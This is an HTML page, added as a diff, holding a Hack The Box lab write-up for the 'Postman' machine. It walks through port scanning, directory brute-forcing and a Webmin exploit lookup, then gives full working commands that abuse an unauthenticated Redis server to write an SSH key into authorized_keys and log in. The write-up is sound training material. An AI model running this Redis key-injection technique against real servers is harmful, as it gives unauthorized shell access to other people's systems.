@@ -1,0 +1,570 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Always stay close to what keeps you feeling alive!">
+    <meta name="author" content="Sabe Barker">
+
+    <title>Postman - Hack The Box · Sabe Barker</title>
+
+    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/postman/">
+
+    <!-- Bootstrap core CSS -->
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+	<!-- Custom CSS -->
+    <link href="/assets/css/sabe.css" rel="stylesheet">
+    <!-- Lightbox -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
+    <!-- Favicons -->
+	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
+	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+	<link rel="manifest" href="/assets/img/favicons/manifest.json">
+	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
+	<link rel="icon" href="/assets/img/favicons/favicon.ico">
+	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
+	<meta name="application-name" content="Sabe Barker">
+	<meta name="msapplication-TileColor" content="#fff">
+	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+	<meta name="theme-color" content="#fff">
+	
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@sabebarker">
+    <meta name="twitter:creator" content="@sabebarker">
+    <meta name="twitter:title" content="Postman - Hack The Box · Sabe Barker">
+    <meta name="twitter:description" content="Always stay close to what keeps you feeling alive!">
+    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/postman/postman_infocard.png">
+
+    <!-- Facebook -->
+    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/postman/" />
+    <meta property="og:title" content="Postman - Hack The Box · Sabe Barker">
+    <meta property="og:description" content="Always stay close to what keeps you feeling alive!">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/postman/postman_infocard.png">
+    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/postman/postman_infocard.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
+	<script>
+  		window.dataLayer = window.dataLayer || [];
+  		function gtag(){dataLayer.push(arguments);}
+  		gtag('js', new Date());
+
+  		gtag('config', 'UA-151243373-1');
+	</script>
+  </head>
+  <body>
+    <a class="skippy sr-only sr-only-focusable" href="#content">
+      <span class="skippy-text">Skip to main content</span>
+    </a>
+
+    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
+      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewBox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"/><stop offset="1" stop-color="#0bb1d3"/></linearGradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"/></svg>{ sabebarker }
+      </a>
+
+      <div class="navbar-nav-scroll">
+        <ul class="navbar-nav sb-navbar-nav flex-row">
+          <li class="nav-item">
+            <a class="nav-link " href="/search">
+        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewBox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"/></svg>
+      </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/">
+	      Home
+	     </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/blog">
+	      Blog
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link active" href="/writeups">
+	      Writeups
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/tools">
+	      Tools
+	    </a>
+          </li>
+        </ul>
+      </div>
+
+      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
+        <li class="nav-item">
+          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title><path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title><path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 24 24" role="img" focusable="false"><title>Facebook</title><path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"/><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg></a>
+       </li>
+      </ul>
+    </header>
+
+
+    <div class="container-fluid">
+      <div class="row flex-xl-nowrap">
+        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
+          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"/></svg></button>
+
+<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
+      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
+        Getting Started
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/getting-started/introduction/">
+              Introduction
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/basic-setup/">
+              Basic Setup
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
+              VPN Setup
+            </a>
+          </li></ul>
+    </div><div class="sb-toc-item active">
+      <a class="sb-toc-link" href="/writeups/hackthebox/machines/nest/">
+        Machines
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/machines/nest/">
+              Nest
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/resolute/">
+              Resolute
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/obscurity/">
+              Obscurity
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/openadmin/">
+              OpenAdmin
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/mango/">
+              Mango
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/traverxec/">
+              Traverxec
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/forest/">
+              Forest
+            </a>
+          </li><li class="active sb-sidenav-active">
+            <a href="/writeups/hackthebox/machines/postman/">
+              Postman
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/scavenger/">
+              Scavenger
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/json/">
+              Json
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/ai/">
+              AI
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/bitlab/">
+              Bitlab
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/craft/">
+              Craft
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/networked/">
+              Networked
+            </a>
+          </li></ul>
+    </div></nav>
+        </div>
+
+        
+          <div class="d-none d-xl-block col-xl-2 sb-toc">
+            <ul class="section-nav">
+<li class="toc-entry toc-h2"><a href="#enumeration">Enumeration</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
+<li class="toc-entry toc-h3"><a href="#directory-bruteforce">Directory Bruteforce</a></li>
+<li class="toc-entry toc-h3"><a href="#domains">Domains</a></li>
+<li class="toc-entry toc-h3"><a href="#webmin">Webmin</a></li>
+<li class="toc-entry toc-h3"><a href="#redis">Redis</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#user">User</a></li>
+<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
+<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
+</ul>
+          </div>
+        
+
+        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
+          <h1 class="sb-title" id="content">Postman</h1>
+          <p class="sb-lead">Always stay close to what keeps you feeling alive!</p>
+          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/postman/postman_infocard.png" alt="HackTheBox Postman Machine Info Card" class="img-fluid" /></p>
+
+<p><strong>Postman</strong> is an easy difficulty machine running Linux. It tests your knowledge in <em>OSINT, Redis exploitation and basic Privilege Escalation through a known exploit.</em> There is nothing overly complicated about this machine as long as you stick to basic enumeration and don’t get too carried away.</p>
+
+<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>
+
+<h3 id="portscan">Portscan</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan postman.htb
+Grabbing ports...
+Ports grabbed!
+Scanning...
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-12-02 06:11 PST
+Nmap scan report <span class="k">for </span>postman.htb <span class="o">(</span>10.10.10.160<span class="o">)</span>
+Host is up <span class="o">(</span>0.35s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: The Cyber Geeks Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 <span class="o">(</span>Webmin httpd<span class="o">)</span>
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>43.36 seconds</code></pre></figure>
+
+<p>From the output we see that we have a website on port <code class="highlighter-rouge">80</code> as well as <code class="highlighter-rouge">redis</code> on port <code class="highlighter-rouge">6379</code> and <code class="highlighter-rouge">webmin</code> on port <code class="highlighter-rouge">10000</code>.</p>
+
+<h3 id="directory-bruteforce">Directory Bruteforce</h3>
+
+<p>Doing a scan with Gobuster using the <code class="highlighter-rouge">dir</code> mode reveals some files and directories:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://postman.htb <span class="nt">-r</span> <span class="nt">-t</span> 30 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> .php,.txt,.html <span class="nt">-o</span> gobuster.txt
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://postman.htb
+<span class="o">[</span>+] Threads:        30
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     php,txt,html
+<span class="o">[</span>+] Follow Redir:   <span class="nb">true</span>
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2019/12/02 06:16:32 Starting gobuster
+<span class="o">===============================================================</span>
+/css <span class="o">(</span>Status: 200<span class="o">)</span>
+/fonts <span class="o">(</span>Status: 200<span class="o">)</span>
+/images <span class="o">(</span>Status: 200<span class="o">)</span>
+/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+/js <span class="o">(</span>Status: 200<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+/upload <span class="o">(</span>Status: 200<span class="o">)</span>
+<span class="o">===============================================================</span>
+2019/12/02 06:22:02 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>An interesting find is the <code class="highlighter-rouge">upload</code> directory!</p>
+
+<h3 id="domains">Domains</h3>
+
+<p>Let’s checkout the website at <code class="highlighter-rouge">http://postman.htb</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/postman/postman.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/postman/postman.htb.png" alt="Postman Main Screenshot" class="img-fluid" /></a></p>
+
+<p>Nothing exciting. Let’s check the <code class="highlighter-rouge">upload</code> directory:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/postman/postman.htb_upload.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/postman/postman.htb_upload.png" alt="Postman Upload Directory Screenshot" class="img-fluid" /></a></p>
+
+<p>We find nothing useful and cannot find an upload form. Let’s move on for now.</p>
+
+<h3 id="webmin">Webmin</h3>
+
+<p>Checking <code class="highlighter-rouge">exploitdb</code> for anything useful we find the following vulnerability relating to our <code class="highlighter-rouge">webmin</code> version:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">searchsploit webmin 1.910
+<span class="nt">--------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
+ Exploit Title                                                                                                                                    |  Path
+                                                                                                                                                  | <span class="o">(</span>/usr/share/exploitdb/<span class="o">)</span>
+<span class="nt">--------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
+Webmin 1.910 - <span class="s1">'Package Updates'</span> Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                                                            | exploits/linux/remote/46984.rb
+<span class="nt">--------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
+Shellcodes: No Result
+Papers: No Result</code></pre></figure>
+
+<p>Taking a look at this exploit we see that it requires valid credentials.</p>
+
+<h3 id="redis">Redis</h3>
+
+<p>Let’s do a quick test and see if we can access <code class="highlighter-rouge">redis</code> without credentials using the tool <code class="highlighter-rouge">redis-cli</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">redis-cli <span class="nt">-h</span> postman.htb <span class="nt">-p</span> 6379 <span class="nb">set </span>with_space <span class="s1">'boo'</span>
+OK</code></pre></figure>
+
+<p>Looks promising! We can connect with <code class="highlighter-rouge">redis-cli -h postman.htb -p 6379</code> where we find that we can change various settings using the <code class="highlighter-rouge">config set</code> command.</p>
+
+<p>Having <code class="highlighter-rouge">redis</code> installed on our local machine allows us to research how <code class="highlighter-rouge">redis</code> is installed and configured. We find that a user named <code class="highlighter-rouge">redis</code> is created and the <code class="highlighter-rouge">home</code> directory for this default user is <code class="highlighter-rouge">/var/lib/redis</code>. So far seems we can only write with <code class="highlighter-rouge">save</code> in <code class="highlighter-rouge">/var/lib/redis</code> so we will focus on that area.</p>
+
+<h2 id="user">User</h2>
+
+<p>After a quick web search we find a vulnerability with misconfigured <code class="highlighter-rouge">redis</code> servers which may allow us to login via <a href="https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html">SSH</a>. If you remember from our <code class="highlighter-rouge">nmap</code> scan the <code class="highlighter-rouge">ssh</code> port <code class="highlighter-rouge">22</code> is open.</p>
+
+<p>Let’s give this a try:</p>
+
+<p>First we create an <em>RSA</em> key pair:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh-keygen <span class="nt">-t</span> rsa
+Generating public/private rsa key pair.
+Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/root/.ssh/id_rsa<span class="o">)</span>: 
+Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
+Enter same passphrase again: 
+Your identification has been saved <span class="k">in</span> /root/.ssh/id_rsa.
+Your public key has been saved <span class="k">in</span> /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:BHSzzWs/IESstXc+Zseq/OVFX9JdCu0oJNeKdSZkMrs root@kali
+The key<span class="s1">'s randomart image is:
++---[RSA 3072]----+
+|     .o.* o      |
+|       +o@ . .   |
+|       o*.B = . .|
+|      .o.B.*.+ oo|
+|        E.*o..+ =|
+|         o += ooo|
+|           oo+. o|
+|         .  .+ . |
+|          oo. .  |
++----[SHA256]-----+</span></code></pre></figure>
+
+<p>Now let’s take our key and put it in a text file with new lines either side. I am assuming this is needed for when we parse it with <code class="highlighter-rouge">redis</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">cat</span> ~/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">&gt;</span> ssh.txt</code></pre></figure>
+
+<p>We will now flush the Redis datastore:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">redis-cli <span class="nt">-h</span> postman.htb flushall
+OK</code></pre></figure>
+
+<p>And write the <code class="highlighter-rouge">ssh.txt</code> file we created in to a keystore on the Redis server via <code class="highlighter-rouge">redis-cli</code> command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>ssh.txt | redis-cli <span class="nt">-h</span> postman.htb <span class="nt">-x</span> <span class="nb">set </span>ssh
+OK</code></pre></figure>
+
+<p>Now we will connect to the <code class="highlighter-rouge">redis-server</code> and set the <code class="highlighter-rouge">dir</code> option to <code class="highlighter-rouge">/var/lib/redis/.ssh</code> and confirm that the options have been updated successfully:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">redis-cli <span class="nt">-h</span> postman.htb
+postman.htb:6379&gt; config <span class="nb">set dir</span> /var/lib/redis/.ssh
+OK
+postman.htb:6379&gt; config get <span class="nb">dir
+</span>1<span class="o">)</span> <span class="s2">"dir"</span>
+2<span class="o">)</span> <span class="s2">"/var/lib/redis/.ssh"</span></code></pre></figure>
+
+<p>We then set the name of the file we want to save to the <code class="highlighter-rouge">dir</code> location and check that the options have been updated successfully:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">postman.htb:6379&gt; config <span class="nb">set </span>dbfilename <span class="s2">"authorized_keys"</span>
+OK
+postman.htb:6379&gt; config get dbfilename
+1<span class="o">)</span> <span class="s2">"dbfilename"</span>
+2<span class="o">)</span> <span class="s2">"authorized_keys"</span></code></pre></figure>
+
+<p>Now for the moment of truth. Can we <code class="highlighter-rouge">save</code> our <code class="highlighter-rouge">ssh</code> key to the <code class="highlighter-rouge">.ssh</code> folder, let’s see:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">postman.htb:6379&gt; save
+OK</code></pre></figure>
+
+<p>Yes we can. The file was saved successfully.</p>
+
+<p>Now to try logging in via <code class="highlighter-rouge">ssh</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> ~/.ssh/id_rsa <span class="nt">-l</span> redis postman.htb
+Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-58-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+
+ <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:~<span class="nv">$ </span></code></pre></figure>
+
+<p>The first thing we notice is that there is no <code class="highlighter-rouge">user.txt</code> in the <code class="highlighter-rouge">redis</code> users home directory. A quick look in <code class="highlighter-rouge">/home</code> shows the directory <code class="highlighter-rouge">Matt</code> which contains the <code class="highlighter-rouge">user.txt</code> flag:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">redis@Postman:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /home/Matt/user.txt 
+<span class="nt">-rw-rw----</span> 1 Matt Matt 33 Aug 26 03:07 /home/Matt/user.txt</code></pre></figure>
+
